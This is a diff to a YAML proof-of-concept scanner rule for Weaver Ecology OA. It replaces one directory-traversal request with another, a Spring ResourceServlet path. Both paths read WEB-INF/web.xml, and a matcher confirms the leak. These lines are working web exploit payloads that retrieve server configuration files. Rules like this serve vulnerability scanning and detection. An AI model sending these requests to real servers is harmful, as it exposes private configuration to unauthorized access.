@@ -1,7 +1,7 @@
-name: poc-yaml-ecology-filedownload-directory-traversal
+name: poc-yaml-ecology-springframework-directory-traversal
 rules:
   - method: GET
-    path: /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+    path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
     follow_redirects: false
     expression: |
       status == 200 && body.bcontains(b'weaver') && body.bcontains(b'ecology')
